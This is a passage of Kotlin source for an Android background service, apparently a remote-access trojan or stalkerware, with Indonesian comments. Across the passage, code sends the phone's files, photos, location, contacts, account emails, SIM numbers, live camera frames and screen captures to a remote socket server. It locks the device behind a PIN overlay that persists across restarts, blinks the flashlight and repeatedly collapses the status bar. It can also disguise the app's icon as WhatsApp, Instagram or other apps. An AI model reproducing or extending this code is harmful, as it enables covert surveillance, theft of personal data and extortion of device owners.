                    })
                    return@Thread
                }

                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    android.os.Environment.isExternalStorageManager()
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }

                val entries = try { dir.listFiles() } catch (_: Exception) { null }

                entries
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        try {
                            arr.put(org.json.JSONObject().apply {
                                put("name",     f.name)
                                put("path",     f.absolutePath)
                                put("isDir",    f.isDirectory)
                                put("size",     if (f.isFile) f.length() else 0L)
                                put("modified", f.lastModified())
                                put("readable", f.canRead())
                            })
                        } catch (_: Exception) {}
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:files", org.json.JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("path",       rootPath)
                    put("files",      arr)
                    put("canReadAll", canReadAll)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileList: ${e.message}")
            }
        }.start()
    }

    private fun downloadAndSendFile(value: String) {
        Thread {
            try {
                val obj   = org.json.JSONObject(value)
                val path  = obj.getString("path")
                val reqId = obj.getString("reqId")
                val file  = java.io.File(path)
                if (!file.exists() || !file.isFile || !file.canRead()) {
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", reqId)
                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64   = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val ext   = file.extension.lowercase()
                val mime  = android.webkit.MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                socket?.emit("device:filedata", org.json.JSONObject().apply {
                    put("reqId",  reqId)
                    put("base64", b64)
                    put("mime",   mime)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
                try {
                    val obj = org.json.JSONObject(value)
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", obj.optString("reqId", ""))
                        put("error", e.message ?: "Error")
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun sendGallery() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} = ?"
                val selectionArgs = arrayOf("Camera")

                val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var count = 0
                    while (c.moveToNext() && count < 100) {
                        val id      = c.getLong(idCol)
                        val name    = c.getString(nameCol) ?: ""
                        val date    = c.getLong(dateCol)
                        val size    = c.getLong(sizeCol)
                        val imgUri  = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())                        
                        try {
                            val opts = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
                            contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, opts) }
                            val maxDim = 300
                            val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
                            val decodeOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
                            val bmp = contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, decodeOpts) }
                            if (bmp != null) {
                                val bos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 72, bos)
                                bmp.recycle()
                                val b64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
                                arr.put(org.json.JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("date",  date)
                                    put("size",  size)
                                    put("thumb", "data:image/jpeg;base64,$b64")
                                })
                                count++
                            }
                        } catch (_: Exception) { }
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gallery", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos",   arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGallery: ${e.message}")
            }
        }.start()
    }
    
    private fun blockApp(pkgJson: String) {
        try {
            val obj  = org.json.JSONObject(pkgJson)
            val pkg  = obj.getString("package")
            val name = obj.optString("name", pkg)
            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
                putExtra("package", pkg)
                putExtra("name", name)
                setPackage(packageName)
            }
            sendBroadcast(i)            
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "blockApp: ${e.message}")
        }
    }

    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockApp: ${e.message}")
        }
    }

    private fun unblockAll() {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockAll: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "permission_denied")
            })
            return
        }

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        if (!gpsOn && !networkOn) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "provider_disabled")
            })
            return
        }

        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        
        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        fusedClient.getCurrentLocation(priority, cts.token)
            .addOnSuccessListener { loc ->
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {                    
                    requestSingleLocationUpdate(fusedClient, priority)
                }
            }
            .addOnFailureListener {
                requestSingleLocationUpdate(fusedClient, priority)
            }
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
        val req = LocationRequest.Builder(priority, 2000L)
            .setMaxUpdates(1)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                fusedClient.removeLocationUpdates(this)
                val loc = result.lastLocation
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {
                    socket?.emit("device:location", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "no_location")
                    })
                }
            }
        }

        try {
            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
            Handler(Looper.getMainLooper()).postDelayed({
                fusedClient.removeLocationUpdates(cb)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "no_location")
            })
        }
    }

    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
        val obj = org.json.JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("accuracy", accuracy)
        }
        try {
            @Suppress("DEPRECATION")
            val geocoder = Geocoder(this, java.util.Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                obj.put("province",    addr.adminArea       ?: "")
                obj.put("city",        addr.subAdminArea    ?: "")
                obj.put("district",    addr.locality        ?: "")
                obj.put("village",     addr.subLocality     ?: "")
                obj.put("postalCode",  addr.postalCode      ?: "")
                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
                obj.put("countryName", addr.countryName     ?: "")
            }
        } catch (_: Exception) { }
        socket?.emit("device:location", obj)
    }

    private fun sendContacts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:contacts", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        val name   = c.getString(nameCol) ?: continue
                        val number = c.getString(numCol)  ?: continue
                        arr.put(org.json.JSONObject().apply {
                            put("name",   name.trim())
                            put("number", number.trim())
                        })
                    }
                }
                socket?.emit("device:contacts", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContacts: ${e.message}")
            }
        }.start()
    }

    private fun sendGmailAccounts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:gmail", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val am = getSystemService(android.accounts.AccountManager::class.java)
                val accounts = am?.getAccountsByType("com.google") ?: emptyArray()
                val arr = org.json.JSONArray()
                accounts.forEach { acc ->
                    arr.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                // Juga ambil semua akun non-Google
                val allAccounts = am?.accounts ?: emptyArray()
                val extra = org.json.JSONArray()
                allAccounts.filter { it.type != "com.google" }.forEach { acc ->
                    extra.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                    put("others", extra)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGmailAccounts: ${e.message}")
            }
        }.start()
    }

    private fun sendPhoneNumbers() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val subMgr = getSystemService(android.telephony.SubscriptionManager::class.java)
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
                        if (subs.isEmpty()) {
                            // Fallback ke slot tunggal
                            val num = tm.line1Number
                            if (!num.isNullOrBlank()) {
                                arr.put(JSONObject().apply {
                                    put("slot", 0)
                                    put("number", num)
                                    put("operator", tm.networkOperatorName ?: "")
                                    put("simState", tm.simState)
                                })
                            }
                        } else {
                            subs.forEachIndexed { idx, sub ->
                                val num = sub.number ?: ""
                                arr.put(JSONObject().apply {
                                    put("slot", idx)
                                    put("number", num)
                                    put("operator", sub.carrierName ?: "")
                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
                                    put("iccId", sub.iccId ?: "")
                                })
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val num = tm.line1Number
                        arr.put(JSONObject().apply {
                            put("slot", 0)
                            put("number", num ?: "")
                            put("operator", tm.networkOperatorName ?: "")
                        })
                    }
                }
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("sims", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId); put("error", e.message)
                })
            }
        }.start()
    }

    private fun lockDevice(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockOverlayService::class.java).apply {
                putExtra(LockOverlayService.EXTRA_PIN, pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

            startLockFlashBlink()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockDevice error: ${e.message}")
        }
    }

    private fun unlockDevice() {
        lockPin   = ""
        lockTitle = ""
        stopLockFlashBlink()
        lockMediaPlayer?.release()
        lockMediaPlayer = null
        stopStatusBarCollapse()
        removeLockCustomOverlay() // hapus floating overlay custom kalau ada
        val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply {
            put("deviceLocked", false)
            put("lockTitle", "")
        })
    }

    // ═════════════════════════════════════════════════════════════════════════
    // PERSISTENT LOCK HANDLERS (kebal restart)
    // ═════════════════════════════════════════════════════════════════════════

    private fun lockLowPersistent(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "1234")
            val title = obj.optString("title", "Device Locked")

            PersistentLockService.saveAndStartLock(
                context = this,
                lockType = PersistentLockService.LOCK_TYPE_LOW,
                pin = pin,
                title = title
            )

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
            Log.d("DeviceService", "Lock Low Persistent started: $title")
        } catch (e: Exception) {
            Log.e("DeviceService", "lockLowPersistent error: ${e.message}")
        }
    }

    private fun lockCustomPersistent(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "1234")
            val title = obj.optString("title", "Custom Lock")
            val html  = obj.optString("html", "")

            PersistentLockService.saveAndStartLock(
                context = this,
                lockType = PersistentLockService.LOCK_TYPE_CUSTOM,
                pin = pin,
                title = title,
                html = html
            )

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
            Log.d("DeviceService", "Lock Custom Persistent started: $title")
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustomPersistent error: ${e.message}")
        }
    }

    private fun lockComboPersistent(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "1234")
            val title = obj.optString("title", "Combo Lock")
            val html  = obj.optString("html", "")
            val crash = obj.optBoolean("crash", false)
            val sound = obj.optBoolean("sound", false)
            val flash = obj.optBoolean("flash", false)

            PersistentLockService.saveAndStartLock(
                context = this,
                lockType = PersistentLockService.LOCK_TYPE_COMBO,
                pin = pin,
                title = title,
                html = html,
                crash = crash,
                sound = sound,
                flash = flash
            )

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
            Log.d("DeviceService", "Lock Combo Persistent started: $title")
        } catch (e: Exception) {
            Log.e("DeviceService", "lockComboPersistent error: ${e.message}")
        }
    }

    private fun unlockPersistent() {
        try {
            PersistentLockService.unlockAll(this)
            
            emitStatus(JSONObject().apply {
                put("deviceLocked", false)
                put("lockTitle", "")
            })
            Log.d("DeviceService", "Persistent lock unlocked via dashboard")
        } catch (e: Exception) {
            Log.e("DeviceService", "unlockPersistent error: ${e.message}")
        }
    }

    // ── Change Theme (icon & nama app) ────────────────────────────────────────
    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            // Disable semua alias dulu
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Enable alias yang dipilih
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
            Log.d("DeviceService", "changeTheme: $theme -> $chosen")
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    // ── Lock Custom (floating WebView overlay — tidak masuk app) ─────────────
    private var lockCustomView: android.webkit.WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null

    private fun lockCustom(htmlContent: String) {
        try {
            if (htmlContent.isEmpty()) {
                removeLockCustomOverlay()
                unlockDevice()
                return
            }
            lockPin   = ""
            lockTitle = ""

            removeLockCustomOverlay() // clear previous if any

            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    // Bungkus HTML dengan full-screen black background
                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
${htmlContent}
</body>
</html>"""

                    val wv = android.webkit.WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()
            emitStatus(JSONObject().apply { put("deviceLocked", true); put("lockTitle", "CUSTOM") })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }
    
    
    

    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val service = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    val method = clazz.getMethod("collapsePanels")
                    method.invoke(service)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 80)
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try { Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } } catch (_: Exception) {}
        }
        lockCustomView = null
    }

        private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashHandler?.removeCallbacks(lockFlashRunnable ?: return)
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startCamera(facing: String) {
        // Check camera permission for Android 15-16+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e("DeviceService", "❌ Camera permission not granted!")
                emitStatus(JSONObject().apply { 
                    put("cameraActive", false)
                    put("error", "Camera permission required")
                })
                return
            }
        }
        
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun requestScreenCapture() {
        if (savedProjectionResultCode == android.app.Activity.RESULT_OK && savedProjectionData != null) {
            startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
            return
        }
        val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        stopScreenCapture()

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val capW: Int; val capH: Int; val capDpi: Int
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            val scale  = 0.3f
            capW   = (bounds.width()  * scale).toInt()
            capH   = (bounds.height() * scale).toInt()
            capDpi = resources.displayMetrics.densityDpi
        } else {
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(metrics)
            val scale = 0.3f
            capW   = (metrics.widthPixels  * scale).toInt()
            capH   = (metrics.heightPixels * scale).toInt()
            capDpi = metrics.densityDpi
        }

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(resultCode, data)

        imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 3)

        mediaProjection?.createVirtualDisplay(
            "ScreenLive", capW, capH, capDpi,
            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )

        screenStreaming = true
        emitStatus(JSONObject().apply { put("screenActive", true) })

        screenHandler = Handler(Looper.getMainLooper())
        screenRunnable = object : Runnable {
            override fun run() {
                if (!screenStreaming) return
                if (!screenIsSending) captureAndSendScreen()
                screenHandler?.postDelayed(this, 150)
            }
        }
        screenHandler?.post(screenRunnable!!)
    }

    private var screenIsSending = false

    private fun captureAndSendScreen() {
        val reader = imageReader ?: return
        var image: android.media.Image? = null
        try {
            image = reader.acquireLatestImage() ?: return
            val planes      = image.planes
            val buffer      = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride   = planes[0].rowStride
            val rowPadding  = rowStride - pixelStride * image.width

            val bmp = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)

            val cropped = if (rowPadding > 0)
                Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
            else bmp

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 35, baos)
            if (cropped !== bmp) cropped.recycle()
            bmp.recycle()
            image.close(); image = null

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            screenIsSending = true
            Thread {
                try { emitScreenFrame(b64) }
                finally { screenIsSending = false }
            }.start()
        } catch (_: Exception) {
        } finally {
            image?.close()
        }
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
        screenHandler  = null
        screenRunnable = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        emitStatus(JSONObject().apply { put("screenActive", false) })
    }

    private fun emitScreenFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("screen:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
